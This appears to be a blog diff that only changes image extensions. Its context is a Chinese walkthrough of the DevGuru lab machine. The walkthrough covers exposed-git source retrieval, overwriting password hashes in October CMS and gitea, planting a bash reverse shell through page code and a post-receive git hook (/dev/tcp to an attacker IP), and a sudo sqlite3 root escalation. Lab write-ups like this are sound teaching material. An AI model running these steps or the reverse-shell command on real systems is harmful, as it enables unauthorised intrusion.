@@ -194,7 +194,7 @@ Host is up <span class="o">(</span>0.0068s latency<span class="o">)</span>.</cod
 </div>
 </div>
 <p>机器 IP 为 <strong>10.1.1.68</strong>：</p>
-<p><img src="/images/2021-06-23/login.png" alt="login"></p>
+<p><img src="/images/2021-06-23/login.webp" alt="login"></p>
 <p>可能机器出现了一些问题，后续过程全部以 IP 为 79 进行。</p>
 <h2 id="端口扫描及服务枚举">端口扫描及服务枚举</h2>
 <p>首先进行全 TCP 端口的 SYN 扫描，发现开放 TCP 端口 22，80，8585：</p>
@@ -410,11 +410,11 @@ PORT      STATE         SERVICE      VERSION
 </div>
 <h2 id="80-端口枚举">80 端口枚举</h2>
 <p>访问主页，借助 Wappanalyzer 了解到其使用了 <strong>October CMS</strong>，版本尚不明确：</p>
-<p><img src="/images/2021-06-23/index.png" alt="index"></p>
+<p><img src="/images/2021-06-23/index.webp" alt="index"></p>
 <p>其管理页面的 URL 为 /backend：</p>
-<p><img src="/images/2021-06-23/backend.png" alt="backend"></p>
+<p><img src="/images/2021-06-23/backend.webp" alt="backend"></p>
 <p>结合之前 nmap 服务枚举的输出，在 /etc/hosts 中为 IP <strong>10.1.1.68</strong> 添加域名 <strong>devguru.local</strong>。同时该输出揭示了整个项目目录暴露在了 Web 服务器之下，使用 <strong>gitjacker</strong> 拉下整个项目：</p>
-<p><img src="/images/2021-06-23/gitjacker.png" alt="gitjacker"></p>
+<p><img src="/images/2021-06-23/gitjacker.webp" alt="gitjacker"></p>
 <p>然后就是代码审计了，config 目录下的 database.php 中包含了数据库的凭据：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -459,14 +459,14 @@ PORT      STATE         SERVICE      VERSION
 </div>
 </div>
 <p>同时根目录下存在 <strong>adminer.php</strong> 文件，经过查阅发现是类似 <strong>phpmyadmin</strong> 的管理工具，访问 <a href="http://devguru.local/adminer.php">http://devguru.local/adminer.php</a>：</p>
-<p><img src="/images/2021-06-22/adminer.png" alt="adminer"></p>
+<p><img src="/images/2021-06-22/adminer.webp" alt="adminer"></p>
 <p>利用刚才获得的凭据登录，在 backend_users 表中发现 cms 存储的用户及 hash：</p>
-<p><img src="/images/2021-06-22/backend_users.png" alt="backend_users"></p>
+<p><img src="/images/2021-06-22/backend_users.webp" alt="backend_users"></p>
 <h2 id="8585-端口枚举">8585 端口枚举</h2>
 <p>通过浏览器访问，发现其背后运行着 <strong>gitea</strong>：</p>
-<p><img src="/images/2021-06-23/gitea.png" alt="gitea"></p>
+<p><img src="/images/2021-06-23/gitea.webp" alt="gitea"></p>
 <p>其版本为 <strong>1.12.5</strong>，发现一个用户 frank：</p>
-<p><img src="/images/2021-06-23/frank.png" alt="frank"></p>
+<p><img src="/images/2021-06-23/frank.webp" alt="frank"></p>
 <h1 id="漏洞搜索">漏洞搜索</h1>
 <h2 id="october-cms-469">October CMS 469</h2>
 <p>Exploits: No Results</p>
@@ -508,7 +508,7 @@ Analyzing <span class="s1">&#39;$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3
 <span class="o">[</span>+<span class="o">]</span> bcrypt </code></pre></td></tr></table>
 </div>
 </div>
-<p><img src="/images/2021-06-23/john.png" alt="john"></p>
+<p><img src="/images/2021-06-23/john.webp" alt="john"></p>
 <p>破解一会后实在无望，接着尝试通过覆盖 hash 的方式进入后台。首先利用 htpasswd 生成 hash，</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -523,16 +523,16 @@ Analyzing <span class="s1">&#39;$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3
 </div>
 </div>
 <p>这里 &quot;&quot; 指代的是用户名，结果中有一个“:”，由于用户名为空，故冒号前并无内容，修改 password 字段的值并保存：</p>
-<p><img src="/images/2021-06-23/change.png" alt="change"></p>
+<p><img src="/images/2021-06-23/change.webp" alt="change"></p>
 <p>利用用户名 &ldquo;frank&rdquo; 和密码 &ldquo;haha&rdquo; 成功登录进后台：</p>
-<p><img src="/images/2021-06-23/cms_backend.png" alt="cms_backend"></p>
+<p><img src="/images/2021-06-23/cms_backend.webp" alt="cms_backend"></p>
 <p>这里稍稍研究了以下怎么才能执行任意 php 代码，由于 cms 版本很新，直接上传 webshell 过滤已经比较严格了，尝试一会无果，放弃。</p>
-<p><img src="/images/2021-06-23/upload.png" alt="upload"></p>
+<p><img src="/images/2021-06-23/upload.webp" alt="upload"></p>
 <p>转之直接修改 cms 的页面，这里需要注意的是编辑的页面并非原始页面，会经过额外的处理，刚开始直接在 <strong>Markup</strong> 窗口中写入 php 语句但不生效。后查看 October CMS 的文档，代码逻辑需写在 <strong>Code</strong> 内，且逻辑必须封装在函数内（直接写 php 语句报错发现的）。</p>
 <p>这里我选择修改 <strong>about</strong>，先尝试执行 phpinfo：</p>
-<p><img src="/images/2021-06-23/about.png" alt="about"></p>
+<p><img src="/images/2021-06-23/about.webp" alt="about"></p>
 <p>访问 about 页面，成功执行：</p>
-<p><img src="/images/2021-06-23/phpinfo.png" alt="phpinfo"></p>
+<p><img src="/images/2021-06-23/phpinfo.webp" alt="phpinfo"></p>
 <p>写入一个 bash 反弹shell：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -550,7 +550,7 @@ Analyzing <span class="s1">&#39;$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3
 </div>
 </div>
 <p>nc 监听本地 8080 端口，访问 about 页面，成功获取 Initial Shell！</p>
-<p><img src="/images/2021-06-23/initial.png" alt="initial"></p>
+<p><img src="/images/2021-06-23/initial.webp" alt="initial"></p>
 <h1 id="提权">提权</h1>
 <h2 id="提升为-frank">提升为 frank</h2>
 <p>经过一番枚举，发现 gitea 以 frank 用户运行，webshell 的用户 www-data，且 gitea 1.12.5 存在一个 RCE 漏洞。发现 gitea 配置文件的本分 /var/backup/app.ini.bak，其中有关数据库的部分：</p>
@@ -573,13 +573,13 @@ Analyzing <span class="s1">&#39;$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3
 </div>
 </div>
 <p>继续使用 adminer.php 来访问数据库，user 表中包含了账户信息：</p>
-<p><img src="/images/2021-06-23/user.png" alt="user"></p>
+<p><img src="/images/2021-06-23/user.webp" alt="user"></p>
 <p>这里 gitea 使用的是 <strong>PBKDF2</strong> 哈希算法，想重复之前的方法，覆盖 hash，但生成 hash 一直不成功。索性直接修改 hash 类别，复用之前 bcrypt 的 hash：</p>
-<p><img src="/images/2021-06-23/bcrypt.png" alt="bcrypt"></p>
+<p><img src="/images/2021-06-23/bcrypt.webp" alt="bcrypt"></p>
 <p>使用密码 <strong>haha</strong> 登录 gitea，成功登录：</p>
-<p><img src="/images/2021-06-23/git_login.png" alt="git_login"></p>
+<p><img src="/images/2021-06-23/git_login.webp" alt="git_login"></p>
 <p>接着就利用原本的项目，对其 Git Hooks 进行修改，写入 bash reverse shell，具体位于 Settings &ndash;&gt; Git Hooks &ndash;&gt; post-receive：</p>
-<p><img src="/images/2021-06-23/proj.png" alt="proj"></p>
+<p><img src="/images/2021-06-23/proj.webp" alt="proj"></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -592,10 +592,10 @@ Analyzing <span class="s1">&#39;$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3
 <span class="nb">exec</span> bash -c <span class="s2">&#34;bash -i &gt;/dev/tcp/10.10.1.2/8080 0&gt;&amp;1 2&gt;&amp;1&#34;</span></code></pre></td></tr></table>
 </div>
 </div>
-<p><img src="/images/2021-06-23/git_hooks.png" alt="git_hooks"></p>
+<p><img src="/images/2021-06-23/git_hooks.webp" alt="git_hooks"></p>
 <p>随便修改一个项目文件，之后添加、commit 并提交，即可触发 reverse shell：</p>
-<p><img src="/images/2021-06-23/commit.png" alt="commit"></p>
-<p><img src="/images/2021-06-23/frank_rev.png" alt="frank_rev"></p>
+<p><img src="/images/2021-06-23/commit.webp" alt="commit"></p>
+<p><img src="/images/2021-06-23/frank_rev.webp" alt="frank_rev"></p>
 <h2 id="提升为-root">提升为 root</h2>
 <p>查看 frank 用户具有的 sudo 权限，可以以非 root 的其它用户执行 sqlite3，google 之后发现对于用户的限制可以被绕过：</p>
 <div class="highlight"><div class="chroma">
@@ -621,7 +621,7 @@ User frank may run the following commands on devguru:
 </div>
 </div>
 <p>绕过后在 sqlite 中执行 /bin/sh，获取到 root 权限：</p>
-<p><img src="/images/2021-06-23/root.png" alt="root"></p>
+<p><img src="/images/2021-06-23/root.webp" alt="root"></p>
 <h1 id="参考">参考</h1>
 <ol>
 <li><a href="https://www.liam-galvin.co.uk/security/2020/09/26/leaking-git-repos-from-misconfigured-sites.html">Leaking Git Repositories From Misconfigured Sites</a></li>
